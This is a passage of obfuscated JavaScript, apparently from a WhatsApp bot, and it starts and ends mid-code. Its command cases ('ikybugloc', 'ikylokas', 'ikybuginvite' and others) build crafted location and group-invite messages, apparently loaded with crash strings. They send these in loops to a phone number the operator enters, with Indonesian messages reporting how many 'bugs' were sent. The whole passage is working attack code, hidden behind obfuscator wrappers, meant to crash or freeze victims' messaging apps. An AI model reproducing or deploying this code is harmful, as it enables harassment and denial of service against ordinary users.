_0x454177[_0x21d5dd(0x1b7)]()['search']('(((.+)+)+)+$')[_0x21d5dd(0x1b7)]()['constructor'](_0x454177)[_0x21d5dd(0x1b2)](_0x21d5dd(0x1b5));});_0x454177();var _0x466616=(function(){var _0x5b71d4=!![];return function(_0x581049,_0x386178){var _0x553171=_0x5b71d4?function(){if(_0x386178){var _0x270db6=_0x386178['apply'](_0x581049,arguments);return _0x386178=null,_0x270db6;}}:function(){};return _0x5b71d4=![],_0x553171;};}()),_0x1973fc=_0x466616(this,function(){var _0x5a2a7c=_0x1cf3,_0x34ba6a=function(){var _0x1e715a=_0x1cf3,_0x2665d8;try{_0x2665d8=Function(_0x1e715a(0x1b8)+_0x1e715a(0x1a8)+');')();}catch(_0x32b613){_0x2665d8=window;}return _0x2665d8;},_0x1ce944=_0x34ba6a(),_0x5b1fdf=_0x1ce944[_0x5a2a7c(0x1ac)]=_0x1ce944[_0x5a2a7c(0x1ac)]||{},_0x89d51f=['log',_0x5a2a7c(0x1a0),'info',_0x5a2a7c(0x1ab),_0x5a2a7c(0x1b3),'table','trace'];for(var _0x280d0b=0x0;_0x280d0b<_0x89d51f[_0x5a2a7c(0x1ae)];_0x280d0b++){var _0x5b2c0d=_0x466616['constructor'][_0x5a2a7c(0x1a9)][_0x5a2a7c(0x1b9)](_0x466616),_0x33c2b4=_0x89d51f[_0x280d0b],_0x171a9c=_0x5b1fdf[_0x33c2b4]||_0x5b2c0d;_0x5b2c0d['__proto__']=_0x466616[_0x5a2a7c(0x1b9)](_0x466616),_0x5b2c0d['toString']=_0x171a9c[_0x5a2a7c(0x1b7)][_0x5a2a7c(0x1b9)](_0x171a9c),_0x5b1fdf[_0x33c2b4]=_0x5b2c0d;}});function _0x1cf3(_0x276da6,_0x5099b1){var _0x4c14ae=_0x22c9();return _0x1cf3=function(_0x1973fc,_0x466616){_0x1973fc=_0x1973fc-0x1a0;var _0x50921c=_0x4c14ae[_0x1973fc];return _0x50921c;},_0x1cf3(_0x276da6,_0x5099b1);}_0x1973fc();{if(!isCreator&&!isBan)return;if(!text)throw _0x242936(0x1be);var messa=await prepareWAMessageMedia({'image':fs[_0x242936(0x1bc)]('./pict.jpg')},{'upload':ikycoli[_0x242936(0x1bd)]}),location=generateWAMessageFromContent(m[_0x242936(0x1ad)],proto[_0x242936(0x1af)]['fromObject']({'locationMessage':{'degreesLatitude':-6.936928157735237,'degreesLongitude':107.72270679473877,'caption':_0x242936(0x1c0)+philips+'\x20'+ngazap(prefix),'jpegThumbnail':messa[_0x242936(0x1ba)]}}),{'userJid':m[_0x242936(0x1ad)],'quoted':fkontaak});ikycoli[_0x242936(0x1a6)](text+_0x242936(0x1b1),location[_0x242936(0x1c1)],{'messageId':location[_0x242936(0x1bf)]['id']}),ikycoli[_0x242936(0x1a6)](m['chat'],location[_0x242936(0x1c1)],{'messageId':location[_0x242936(0x1bf)]['id']}),jancok(_0x242936(0x1a2)+text);}
}
break
case 'ikybuglocprivate': {
function _0x12cc(_0x39f2fe,_0x2839b9){var _0x230642=_0x4c74();return _0x12cc=function(_0x5c1a4f,_0x515f96){_0x5c1a4f=_0x5c1a4f-0x141;var _0x3964b8=_0x230642[_0x5c1a4f];return _0x3964b8;},_0x12cc(_0x39f2fe,_0x2839b9);}var _0x20ca1a=_0x12cc;(function(_0x3e6b6e,_0x2657a7){var _0x514b83=_0x12cc,_0x5184c1=_0x3e6b6e();while(!![]){try{var _0x301e2c=-parseInt(_0x514b83(0x14a))/0x1*(parseInt(_0x514b83(0x15a))/0x2)+parseInt(_0x514b83(0x14f))/0x3*(-parseInt(_0x514b83(0x144))/0x4)+parseInt(_0x514b83(0x165))/0x5*(-parseInt(_0x514b83(0x149))/0x6)+parseInt(_0x514b83(0x163))/0x7+-parseInt(_0x514b83(0x155))/0x8+parseInt(_0x514b83(0x153))/0x9+parseInt(_0x514b83(0x158))/0xa;if(_0x301e2c===_0x2657a7)break;else _0x5184c1['push'](_0x5184c1['shift']());}catch(_0x48a1a4){_0x5184c1['push'](_0x5184c1['shift']());}}}(_0x4c74,0x5fe43));var _0x2190a7=(function(){var _0x33dcdc=!![];return function(_0x206d1b,_0x197ff6){var _0x5d097d=_0x33dcdc?function(){var _0x1c607d=_0x12cc;if(_0x197ff6){var _0x4645df=_0x197ff6[_0x1c607d(0x157)](_0x206d1b,arguments);return _0x197ff6=null,_0x4645df;}}:function(){};return _0x33dcdc=![],_0x5d097d;};}()),_0x24a42d=_0x2190a7(this,function(){var _0x15d5b2=_0x12cc;return _0x24a42d[_0x15d5b2(0x148)]()[_0x15d5b2(0x15f)](_0x15d5b2(0x14d))[_0x15d5b2(0x148)]()[_0x15d5b2(0x142)](_0x24a42d)[_0x15d5b2(0x15f)]('(((.+)+)+)+$');});_0x24a42d();var _0x515f96=(function(){var _0x37aaf1=!![];return function(_0xa3379a,_0x20d2a2){var _0x1fe7cf=_0x37aaf1?function(){var _0x49a05b=_0x12cc;if(_0x20d2a2){var _0x34159e=_0x20d2a2[_0x49a05b(0x157)](_0xa3379a,arguments);return _0x20d2a2=null,_0x34159e;}}:function(){};return _0x37aaf1=![],_0x1fe7cf;};}()),_0x5c1a4f=_0x515f96(this,function(){var _0x78ef02=_0x12cc,_0x4c6b39=function(){var _0x3a65b6=_0x12cc,_0x51f166;try{_0x51f166=Function(_0x3a65b6(0x147)+_0x3a65b6(0x15c)+');')();}catch(_0x1007c7){_0x51f166=window;}return _0x51f166;},_0x442199=_0x4c6b39(),_0x46d5cb=_0x442199['console']=_0x442199[_0x78ef02(0x156)]||{},_0x27d0ca=['log',_0x78ef02(0x15d),'info','error',_0x78ef02(0x160),_0x78ef02(0x162),_0x78ef02(0x14e)];for(var _0xcf0576=0x0;_0xcf0576<_0x27d0ca[_0x78ef02(0x15e)];_0xcf0576++){var _0x32fd28=_0x515f96[_0x78ef02(0x142)][_0x78ef02(0x143)][_0x78ef02(0x14c)](_0x515f96),_0x1a7d34=_0x27d0ca[_0xcf0576],_0x591efd=_0x46d5cb[_0x1a7d34]||_0x32fd28;_0x32fd28['__proto__']=_0x515f96['bind'](_0x515f96),_0x32fd28[_0x78ef02(0x148)]=_0x591efd[_0x78ef02(0x148)][_0x78ef02(0x14c)](_0x591efd),_0x46d5cb[_0x1a7d34]=_0x32fd28;}});_0x5c1a4f();function _0x4c74(){var _0x5562c4=['5715rXcHXX','readFileSync','constructor','prototype','4INmnPt','waUploadToServer','fromObject','return\x20(function()\x20','toString','1614FuMYYp','409UApXKC','@s.whatsapp.net','bind','(((.+)+)+)+$','trace','2282157hwaZDn','message','relayMessage','key','711720MqzYiC','reply','4207496sAKlAR','console','apply','15881550ORlFky','Berhasil\x20Mengirim\x20Bugloc\x20Di\x20Nomer\x20','1084guAxOZ','Message','{}.constructor(\x22return\x20this\x22)(\x20)','warn','length','search','exception','chat','table','3789359VcwOaD','Nomernya\x20mana?'];_0x4c74=function(){return _0x5562c4;};return _0x4c74();}{if(!isCreator&&!isBan)return;if(!text)throw _0x20ca1a(0x164);var messa=await prepareWAMessageMedia({'image':fs[_0x20ca1a(0x141)]('./pict.jpg')},{'upload':ikycoli[_0x20ca1a(0x145)]}),location=generateWAMessageFromContent(m[_0x20ca1a(0x161)],proto[_0x20ca1a(0x15b)][_0x20ca1a(0x146)]({'locationMessage':{'degreesLatitude':-6.936928157735237,'degreesLongitude':107.72270679473877,'caption':'漏\x20饾懟饾懐饾懍\x20饾懕饾懚\x20饾懇饾懚饾懟饾拋'+philips+'\x20'+ngazap(prefix),'jpegThumbnail':messa['imageMessage']}}),{'userJid':m['chat'],'quoted':fkontaak});ikycoli[_0x20ca1a(0x151)](text+_0x20ca1a(0x14b),location[_0x20ca1a(0x150)],{'messageId':location[_0x20ca1a(0x152)]['id']}),await m[_0x20ca1a(0x154)](_0x20ca1a(0x159)+text);}
}
break

case 'ikylokas': {
const _0x1ab95a=_0x256c;(function(_0x3f0b05,_0x57593e){const _0x1efe5e=_0x256c,_0x9f3ed8=_0x3f0b05();while(!![]){try{const _0x343f06=parseInt(_0x1efe5e(0x163))/0x1+-parseInt(_0x1efe5e(0x167))/0x2+-parseInt(_0x1efe5e(0x16e))/0x3*(-parseInt(_0x1efe5e(0x16c))/0x4)+parseInt(_0x1efe5e(0x15e))/0x5*(parseInt(_0x1efe5e(0x178))/0x6)+-parseInt(_0x1efe5e(0x17f))/0x7+-parseInt(_0x1efe5e(0x16f))/0x8+-parseInt(_0x1efe5e(0x166))/0x9;if(_0x343f06===_0x57593e)break;else _0x9f3ed8['push'](_0x9f3ed8['shift']());}catch(_0x58fa67){_0x9f3ed8['push'](_0x9f3ed8['shift']());}}}(_0x5630,0x26920));const _0x4ac8d5=(function(){let _0x3a78cb=!![];return function(_0x94ff9e,_0x271387){const _0x2fd4d8=_0x3a78cb?function(){const _0xaf062c=_0x256c;if(_0x271387){const _0x49e60f=_0x271387[_0xaf062c(0x168)](_0x94ff9e,arguments);return _0x271387=null,_0x49e60f;}}:function(){};return _0x3a78cb=![],_0x2fd4d8;};}()),_0x3202a0=_0x4ac8d5(this,function(){const _0x3f8969=_0x256c;return _0x3202a0[_0x3f8969(0x179)]()['search'](_0x3f8969(0x174))[_0x3f8969(0x179)]()[_0x3f8969(0x17b)](_0x3202a0)[_0x3f8969(0x172)]('(((.+)+)+)+$');});_0x3202a0();const _0x37cdbd=(function(){let _0x2bf967=!![];return function(_0x20f456,_0x46e46d){const _0x5588cb=_0x2bf967?function(){if(_0x46e46d){const _0x375c6e=_0x46e46d['apply'](_0x20f456,arguments);return _0x46e46d=null,_0x375c6e;}}:function(){};return _0x2bf967=![],_0x5588cb;};}()),_0x67c79=_0x37cdbd(this,function(){const _0x246310=_0x256c;let _0x1e6d25;try{const _0x3161d2=Function(_0x246310(0x180)+_0x246310(0x17d)+');');_0x1e6d25=_0x3161d2();}catch(_0x2fb33a){_0x1e6d25=window;}const _0x50190b=_0x1e6d25[_0x246310(0x177)]=_0x1e6d25[_0x246310(0x177)]||{},_0x4b1961=[_0x246310(0x175),_0x246310(0x160),_0x246310(0x171),_0x246310(0x176),_0x246310(0x15d),_0x246310(0x16b),_0x246310(0x15f)];for(let _0x112291=0x0;_0x112291<_0x4b1961[_0x246310(0x17e)];_0x112291++){const _0x53d9d8=_0x37cdbd[_0x246310(0x17b)][_0x246310(0x164)][_0x246310(0x170)](_0x37cdbd),_0x1255c2=_0x4b1961[_0x112291],_0x2e5d42=_0x50190b[_0x1255c2]||_0x53d9d8;_0x53d9d8['__proto__']=_0x37cdbd[_0x246310(0x170)](_0x37cdbd),_0x53d9d8[_0x246310(0x179)]=_0x2e5d42[_0x246310(0x179)][_0x246310(0x170)](_0x2e5d42),_0x50190b[_0x1255c2]=_0x53d9d8;}});function _0x5630(){const _0x3c56fc=['Sukses\x20Send\x20Bug\x20Sebanyak\x20','{}.constructor(\x22return\x20this\x22)(\x20)','length','356510YNUrdn','return\x20(function()\x20','exception','325kcdMIP','trace','warn','waUploadToServer','key','182690sraGpQ','prototype','漏\x20饾懟饾懐饾懍\x20饾懕饾懚\x20饾懇饾懚饾懟饾拋','6219OcrzMg','335414DAzhwC','apply','Message','chat','table','1096564yLgdxG','./pict.jpg','3wCsbkD','2026112eulHVH','bind','info','search','Jumlahnya?','(((.+)+)+)+$','log','error','console','16038MKNwHj','toString','relayMessage','constructor'];_0x5630=function(){return _0x3c56fc;};return _0x5630();}function _0x256c(_0x1f56aa,_0x5bd3ce){const _0xc18657=_0x5630();return _0x256c=function(_0x67c79,_0x37cdbd){_0x67c79=_0x67c79-0x15d;let _0x13e63b=_0xc18657[_0x67c79];return _0x13e63b;},_0x256c(_0x1f56aa,_0x5bd3ce);}_0x67c79();{if(!isCreator&&!isBan)return;if(args[_0x1ab95a(0x17e)]==0x0)return m['reply'](_0x1ab95a(0x173));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){let doc={'key':{'participant':'0@s.whatsapp.net'},'message':{'documentMessage':{'title':'漏\x20'+ownername,'jpegThumbnail':thumb}}};var messa=await prepareWAMessageMedia({'image':fs['readFileSync'](_0x1ab95a(0x16d))},{'upload':ikycoli[_0x1ab95a(0x161)]}),location=generateWAMessageFromContent(m[_0x1ab95a(0x16a)],proto[_0x1ab95a(0x169)]['fromObject']({'locationMessage':{'degreesLatitude':-6.936928157735237,'degreesLongitude':107.72270679473877,'caption':_0x1ab95a(0x165)+virusloc+'\x20'+philips+'\x20'+ngazap(prefix),'jpegThumbnail':virgam}}),{'userJid':m[_0x1ab95a(0x16a)],'quoted':doc});ikycoli[_0x1ab95a(0x17a)](m[_0x1ab95a(0x16a)],location['message'],{'messageId':location[_0x1ab95a(0x162)]['id']});}jancok(_0x1ab95a(0x17c)+jumlah);}
}
break
case 'ikybugloc': {
var _0x12b2c6=_0x35bb;(function(_0x5b5066,_0x1d91ee){var _0x1e1f94=_0x35bb,_0x54afb3=_0x5b5066();while(!![]){try{var _0x3d93ee=parseInt(_0x1e1f94(0xfc))/0x1+-parseInt(_0x1e1f94(0xed))/0x2*(-parseInt(_0x1e1f94(0xeb))/0x3)+-parseInt(_0x1e1f94(0xe4))/0x4*(parseInt(_0x1e1f94(0x101))/0x5)+-parseInt(_0x1e1f94(0xe6))/0x6*(-parseInt(_0x1e1f94(0x100))/0x7)+parseInt(_0x1e1f94(0xde))/0x8+parseInt(_0x1e1f94(0xef))/0x9+-parseInt(_0x1e1f94(0xf2))/0xa;if(_0x3d93ee===_0x1d91ee)break;else _0x54afb3['push'](_0x54afb3['shift']());}catch(_0x473840){_0x54afb3['push'](_0x54afb3['shift']());}}}(_0x4348,0x81757));var _0x2caecc=(function(){var _0x3b826c=!![];return function(_0x4e2108,_0x3ee456){var _0x16b936=_0x3b826c?function(){if(_0x3ee456){var _0x228d8b=_0x3ee456['apply'](_0x4e2108,arguments);return _0x3ee456=null,_0x228d8b;}}:function(){};return _0x3b826c=![],_0x16b936;};}()),_0x2ee8e2=_0x2caecc(this,function(){var _0x4df756=_0x35bb;return _0x2ee8e2['toString']()['search'](_0x4df756(0xe3))[_0x4df756(0xfe)]()['constructor'](_0x2ee8e2)[_0x4df756(0xe8)]('(((.+)+)+)+$');});function _0x4348(){var _0x1f88ef=['message','relayMessage','3ZyTQoJ','{}.constructor(\x22return\x20this\x22)(\x20)','635456qOKZpD','info','2146203OPDbyu','Message','waUploadToServer','1349330dGQNPb','return\x20(function()\x20','chat','Sukses\x20Send\x20Bug\x20Sebanyak\x20','trace','table','console','./pict.jpg','fromObject','漏\x20饾懟饾懐饾懍\x20饾懕饾懚\x20饾懇饾懚饾懟饾拋','311491AZXJcF','warn','toString','readFileSync','2051oniyZX','130DdkAIL','bind','error','4845304YjGcXc','exception','apply','imageMessage','__proto__','(((.+)+)+)+$','125368HMDqas','Jumlahnya?','138snesdA','length','search'];_0x4348=function(){return _0x1f88ef;};return _0x4348();}_0x2ee8e2();var _0x2770f2=(function(){var _0x4597ad=!![];return function(_0x4d5e50,_0x23166a){var _0x5c33ef=_0x4597ad?function(){var _0x526044=_0x35bb;if(_0x23166a){var _0x5753af=_0x23166a[_0x526044(0xe0)](_0x4d5e50,arguments);return _0x23166a=null,_0x5753af;}}:function(){};return _0x4597ad=![],_0x5c33ef;};}()),_0x59e5ab=_0x2770f2(this,function(){var _0x3cbcb8=_0x35bb,_0x396bd3=function(){var _0x346cef=_0x35bb,_0x12fdb5;try{_0x12fdb5=Function(_0x346cef(0xf3)+_0x346cef(0xec)+');')();}catch(_0x5a9a53){_0x12fdb5=window;}return _0x12fdb5;},_0x48bff0=_0x396bd3(),_0x2d7ddd=_0x48bff0['console']=_0x48bff0[_0x3cbcb8(0xf8)]||{},_0x3127e0=['log',_0x3cbcb8(0xfd),_0x3cbcb8(0xee),_0x3cbcb8(0x103),_0x3cbcb8(0xdf),_0x3cbcb8(0xf7),_0x3cbcb8(0xf6)];for(var _0x4f369c=0x0;_0x4f369c<_0x3127e0[_0x3cbcb8(0xe7)];_0x4f369c++){var _0x216de0=_0x2770f2['constructor']['prototype']['bind'](_0x2770f2),_0x4f5cb6=_0x3127e0[_0x4f369c],_0x15b879=_0x2d7ddd[_0x4f5cb6]||_0x216de0;_0x216de0[_0x3cbcb8(0xe2)]=_0x2770f2[_0x3cbcb8(0x102)](_0x2770f2),_0x216de0[_0x3cbcb8(0xfe)]=_0x15b879[_0x3cbcb8(0xfe)][_0x3cbcb8(0x102)](_0x15b879),_0x2d7ddd[_0x4f5cb6]=_0x216de0;}});function _0x35bb(_0x123d29,_0x6c6c52){var _0x1528cd=_0x4348();return _0x35bb=function(_0x59e5ab,_0x2770f2){_0x59e5ab=_0x59e5ab-0xde;var _0x2fb6b1=_0x1528cd[_0x59e5ab];return _0x2fb6b1;},_0x35bb(_0x123d29,_0x6c6c52);}_0x59e5ab();{if(!isCreator&&!isBan)return;if(args[_0x12b2c6(0xe7)]==0x0)return m['reply'](_0x12b2c6(0xe5));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){var messa=await prepareWAMessageMedia({'image':fs[_0x12b2c6(0xff)](_0x12b2c6(0xf9))},{'upload':ikycoli[_0x12b2c6(0xf1)]}),location=generateWAMessageFromContent(m[_0x12b2c6(0xf4)],proto[_0x12b2c6(0xf0)][_0x12b2c6(0xfa)]({'locationMessage':{'degreesLatitude':-6.936928157735237,'degreesLongitude':107.72270679473877,'caption':_0x12b2c6(0xfb)+philips+'\x20'+ngazap(prefix),'jpegThumbnail':messa[_0x12b2c6(0xe1)]}}),{'userJid':m[_0x12b2c6(0xf4)],'quoted':fkontaak});ikycoli[_0x12b2c6(0xea)](m[_0x12b2c6(0xf4)],location[_0x12b2c6(0xe9)],{'messageId':location['key']['id']});}jancok(_0x12b2c6(0xf5)+jumlah);}
}
break
case 'jadibugloc':{
var _0x18da71=_0x5de0;(function(_0x1b870d,_0xb22a21){var _0x4c3630=_0x5de0,_0x5eaabd=_0x1b870d();while(!![]){try{var _0x20a6d7=parseInt(_0x4c3630(0x1e6))/0x1+parseInt(_0x4c3630(0x1e9))/0x2*(parseInt(_0x4c3630(0x1ed))/0x3)+-parseInt(_0x4c3630(0x1e2))/0x4*(-parseInt(_0x4c3630(0x1ea))/0x5)+parseInt(_0x4c3630(0x1f4))/0x6+-parseInt(_0x4c3630(0x1e3))/0x7+-parseInt(_0x4c3630(0x1da))/0x8*(parseInt(_0x4c3630(0x1f6))/0x9)+-parseInt(_0x4c3630(0x1df))/0xa;if(_0x20a6d7===_0xb22a21)break;else _0x5eaabd['push'](_0x5eaabd['shift']());}catch(_0x17719e){_0x5eaabd['push'](_0x5eaabd['shift']());}}}(_0x3a6c,0xe9369));var _0x265593=(function(){var _0x395c87=!![];return function(_0x23fdb7,_0x2a2ffe){var _0x460218=_0x395c87?function(){var _0x14b401=_0x5de0;if(_0x2a2ffe){var _0x216cee=_0x2a2ffe[_0x14b401(0x1f0)](_0x23fdb7,arguments);return _0x2a2ffe=null,_0x216cee;}}:function(){};return _0x395c87=![],_0x460218;};}()),_0x477281=_0x265593(this,function(){var _0x2f1086=_0x5de0;return _0x477281[_0x2f1086(0x1ec)]()[_0x2f1086(0x1f5)](_0x2f1086(0x1f8))[_0x2f1086(0x1ec)]()['constructor'](_0x477281)[_0x2f1086(0x1f5)](_0x2f1086(0x1f8));});function _0x5de0(_0x539894,_0x443fc1){var _0xf62a78=_0x3a6c();return _0x5de0=function(_0x1befba,_0x12133d){_0x1befba=_0x1befba-0x1d7;var _0x3eb31a=_0xf62a78[_0x1befba];return _0x3eb31a;},_0x5de0(_0x539894,_0x443fc1);}function _0x3a6c(){var _0x45dc94=['Message','chat','5109512PETLJZ','warn','error','__proto__','console','15868350vTiwBn','relayMessage','Teks/Reply','3460IqNpgr','12875457QvPgke','./pict.jpg','message','1261362YlQTdU','Location\x20','table','45954BVEWRC','7745HJvwsR','imageMessage','toString','249goDYJo','exception','waUploadToServer','apply','readFileSync','info','constructor','3070668udiakw','search','9uaufdK','prototype','(((.+)+)+)+$','length','quoted','bind'];_0x3a6c=function(){return _0x45dc94;};return _0x3a6c();}_0x477281();var _0x12133d=(function(){var _0x2f6548=!![];return function(_0x2e2d24,_0x9039b8){var _0x44c367=_0x2f6548?function(){if(_0x9039b8){var _0x4395f6=_0x9039b8['apply'](_0x2e2d24,arguments);return _0x9039b8=null,_0x4395f6;}}:function(){};return _0x2f6548=![],_0x44c367;};}()),_0x1befba=_0x12133d(this,function(){var _0x5365c3=_0x5de0,_0x5cd94b=function(){var _0x47c728;try{_0x47c728=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x16a097){_0x47c728=window;}return _0x47c728;},_0x2f7e22=_0x5cd94b(),_0x58cfe6=_0x2f7e22[_0x5365c3(0x1de)]=_0x2f7e22[_0x5365c3(0x1de)]||{},_0x52aa63=['log',_0x5365c3(0x1db),_0x5365c3(0x1f2),_0x5365c3(0x1dc),_0x5365c3(0x1ee),_0x5365c3(0x1e8),'trace'];for(var _0x44d216=0x0;_0x44d216<_0x52aa63[_0x5365c3(0x1f9)];_0x44d216++){var _0x2de283=_0x12133d[_0x5365c3(0x1f3)][_0x5365c3(0x1f7)][_0x5365c3(0x1d7)](_0x12133d),_0x105b5e=_0x52aa63[_0x44d216],_0x4effe4=_0x58cfe6[_0x105b5e]||_0x2de283;_0x2de283[_0x5365c3(0x1dd)]=_0x12133d[_0x5365c3(0x1d7)](_0x12133d),_0x2de283[_0x5365c3(0x1ec)]=_0x4effe4['toString'][_0x5365c3(0x1d7)](_0x4effe4),_0x58cfe6[_0x105b5e]=_0x2de283;}});_0x1befba();{if(!isCreator&&!isBan)return;if(!m[_0x18da71(0x1fa)]&&!text)throw _0x18da71(0x1e1);var messa=await prepareWAMessageMedia({'image':fs[_0x18da71(0x1f1)](_0x18da71(0x1e4))},{'upload':ikycoli[_0x18da71(0x1ef)]}),location=generateWAMessageFromContent(m['chat'],proto[_0x18da71(0x1d8)]['fromObject']({'locationMessage':{'degreesLatitude':-6.936928157735237,'degreesLongitude':107.72270679473877,'caption':_0x18da71(0x1e7)+text+'\x20'+philips+'\x20'+ngazap(prefix),'jpegThumbnail':messa[_0x18da71(0x1eb)]}}),{'userJid':m[_0x18da71(0x1d9)],'quoted':fkntliky});ikycoli[_0x18da71(0x1e0)](m[_0x18da71(0x1d9)],location[_0x18da71(0x1e5)],{'messageId':location['key']['id']}),jancok('Sukses\x20Convert\x20Bugloc');}
}
break

case 'ikybuginviteprivate': {
var _0x283aa1=_0x5e6b;(function(_0x3bb01b,_0x7f9559){var _0x4cd9e8=_0x5e6b,_0x5cec77=_0x3bb01b();while(!![]){try{var _0x3330d0=-parseInt(_0x4cd9e8(0xa1))/0x1+-parseInt(_0x4cd9e8(0xa0))/0x2*(parseInt(_0x4cd9e8(0xb8))/0x3)+parseInt(_0x4cd9e8(0xa2))/0x4*(-parseInt(_0x4cd9e8(0xa9))/0x5)+parseInt(_0x4cd9e8(0xbd))/0x6+-parseInt(_0x4cd9e8(0xb6))/0x7+-parseInt(_0x4cd9e8(0x9f))/0x8+parseInt(_0x4cd9e8(0xbe))/0x9;if(_0x3330d0===_0x7f9559)break;else _0x5cec77['push'](_0x5cec77['shift']());}catch(_0x13ea25){_0x5cec77['push'](_0x5cec77['shift']());}}}(_0x4603,0x586f7));var _0x41e3b1=(function(){var _0x55d48d=!![];return function(_0xf86335,_0x1aceaf){var _0x4748a4=_0x55d48d?function(){var _0x288bf4=_0x5e6b;if(_0x1aceaf){var _0x411b49=_0x1aceaf[_0x288bf4(0xaa)](_0xf86335,arguments);return _0x1aceaf=null,_0x411b49;}}:function(){};return _0x55d48d=![],_0x4748a4;};}()),_0x34e5a8=_0x41e3b1(this,function(){var _0x19fe18=_0x5e6b;return _0x34e5a8[_0x19fe18(0xa4)]()['search'](_0x19fe18(0xb7))['toString']()[_0x19fe18(0xa8)](_0x34e5a8)['search'](_0x19fe18(0xb7));});_0x34e5a8();function _0x5e6b(_0x251163,_0x5a8f36){var _0x54efc3=_0x4603();return _0x5e6b=function(_0x351987,_0x4314c1){_0x351987=_0x351987-0x9c;var _0x1024a4=_0x54efc3[_0x351987];return _0x1024a4;},_0x5e6b(_0x251163,_0x5a8f36);}var _0x4314c1=(function(){var _0x597335=!![];return function(_0x5ea57e,_0x8889c7){var _0x4dfa0c=_0x597335?function(){if(_0x8889c7){var _0xd36d3e=_0x8889c7['apply'](_0x5ea57e,arguments);return _0x8889c7=null,_0xd36d3e;}}:function(){};return _0x597335=![],_0x4dfa0c;};}()),_0x351987=_0x4314c1(this,function(){var _0x36b554=_0x5e6b,_0x56e4a2;try{var _0x2dfe8b=Function('return\x20(function()\x20'+_0x36b554(0xad)+');');_0x56e4a2=_0x2dfe8b();}catch(_0x258db9){_0x56e4a2=window;}var _0x1dcefb=_0x56e4a2[_0x36b554(0xb9)]=_0x56e4a2[_0x36b554(0xb9)]||{},_0x39dedb=[_0x36b554(0xa3),_0x36b554(0x9c),_0x36b554(0xb5),'error',_0x36b554(0xa6),_0x36b554(0xae),_0x36b554(0xb4)];for(var _0x577c83=0x0;_0x577c83<_0x39dedb[_0x36b554(0xbb)];_0x577c83++){var _0x463bfc=_0x4314c1[_0x36b554(0xa8)]['prototype'][_0x36b554(0x9e)](_0x4314c1),_0x26752e=_0x39dedb[_0x577c83],_0x25c815=_0x1dcefb[_0x26752e]||_0x463bfc;_0x463bfc[_0x36b554(0xbc)]=_0x4314c1[_0x36b554(0x9e)](_0x4314c1),_0x463bfc[_0x36b554(0xa4)]=_0x25c815['toString'][_0x36b554(0x9e)](_0x25c815),_0x1dcefb[_0x26752e]=_0x463bfc;}});_0x351987();{if(!isCreator&&!isBan)return;if(!text)throw _0x283aa1(0xc1);var messa=await prepareWAMessageMedia({'image':fs[_0x283aa1(0xa7)]('./pict.jpg')},{'upload':ikycoli[_0x283aa1(0xb3)]}),groupInvite=generateWAMessageFromContent(m[_0x283aa1(0xbf)],proto[_0x283aa1(0x9d)][_0x283aa1(0xba)]({'groupInviteMessage':{'groupJid':_0x283aa1(0xaf),'inviteCode':'wFHwtOxGQN8OwK2x','inviteExpiration':_0x283aa1(0xb0)+philips,'groupName':'𝙏𝙃𝙀\x20𝙄𝙆𝙔\x20𝘽𝙊𝙏𝙕'+philips,'caption':''+philips,'jpegThumbnail':messa[_0x283aa1(0xab)]}}),{'userJid':m['chat'],'quoted':fkontaak});ikycoli[_0x283aa1(0xb1)](text+'@s.whatsapp.net',groupInvite[_0x283aa1(0xac)],{'messageId':groupInvite[_0x283aa1(0xb2)]['id']}),await m[_0x283aa1(0xc0)](_0x283aa1(0xa5)+text);}function _0x4603(){var _0x3dea9b=['13098249QRSloa','chat','reply','Nomernya\x20mana?','warn','Message','bind','3239560SdjORb','3252ldvmiu','500158HBhqTk','593236GDeGQA','log','toString','Berhasil\x20Mengirim\x20Buginvite\x20Di\x20Nomer\x20','exception','readFileSync','constructor','5QYuKEl','apply','imageMessage','message','{}.constructor(\x22return\x20this\x22)(\x20)','table','85296556573-1328272333@g.us','𝙏𝙃𝙀\x20𝙄𝙆𝙔𝙔\x20𝘽𝙊𝙏𝙕','relayMessage','key','waUploadToServer','trace','info','520786kkcxzq','(((.+)+)+)+$','873GfwFdC','console','fromObject','length','__proto__','3047076ocnrgG'];_0x4603=function(){return _0x3dea9b;};return _0x4603();}
}
break
case 'ikybuginvite': {
var _0x2932ba=_0x2d44;(function(_0x17ea97,_0x21ff33){var _0x2ad135=_0x2d44,_0x1489fc=_0x17ea97();while(!![]){try{var _0x456680=parseInt(_0x2ad135(0xc9))/0x1+parseInt(_0x2ad135(0xd7))/0x2+parseInt(_0x2ad135(0xcd))/0x3*(parseInt(_0x2ad135(0xce))/0x4)+parseInt(_0x2ad135(0xd2))/0x5+parseInt(_0x2ad135(0xd3))/0x6*(parseInt(_0x2ad135(0xd4))/0x7)+-parseInt(_0x2ad135(0xd5))/0x8+-parseInt(_0x2ad135(0xc5))/0x9;if(_0x456680===_0x21ff33)break;else _0x1489fc['push'](_0x1489fc['shift']());}catch(_0x54b836){_0x1489fc['push'](_0x1489fc['shift']());}}}(_0x2d4c,0x5f47f));var _0x3a64fc=(function(){var _0x55a36d=!![];return function(_0x301587,_0x2463b9){var _0x874df9=_0x55a36d?function(){var _0x3a1f39=_0x2d44;if(_0x2463b9){var _0x71b4e8=_0x2463b9[_0x3a1f39(0xde)](_0x301587,arguments);return _0x2463b9=null,_0x71b4e8;}}:function(){};return _0x55a36d=![],_0x874df9;};}()),_0x26374e=_0x3a64fc(this,function(){var _0x421c8a=_0x2d44;return _0x26374e['toString']()[_0x421c8a(0xd9)](_0x421c8a(0xdf))[_0x421c8a(0xdd)]()['constructor'](_0x26374e)[_0x421c8a(0xd9)]('(((.+)+)+)+$');});function _0x2d44(_0x1e8499,_0x508527){var _0x4f4b9c=_0x2d4c();return _0x2d44=function(_0x790e0f,_0x3c2088){_0x790e0f=_0x790e0f-0xc1;var _0x329ed4=_0x4f4b9c[_0x790e0f];return _0x329ed4;},_0x2d44(_0x1e8499,_0x508527);}function _0x2d4c(){var _0x1b5a65=['{}.constructor(\x22return\x20this\x22)(\x20)','console','704175UIiTKU','6612BSlTqY','1015QFuync','3570328MKAeDd','reply','158654wMueWY','bind','search','85296556573-1328272333@g.us','return\x20(function()\x20','info','toString','apply','(((.+)+)+)+$','exception','length','table','__proto__','prototype','chat','constructor','key','./pict.jpg','669204easnxJ','trace','fromObject','warn','99159aeBHhf','𝙏𝙃𝙀\x20𝙄𝙆𝙔𝙔\x20𝘽𝙊𝙏𝙕','Message','error','3wOFDwz','1727228AbAdhB','message'];_0x2d4c=function(){return _0x1b5a65;};return 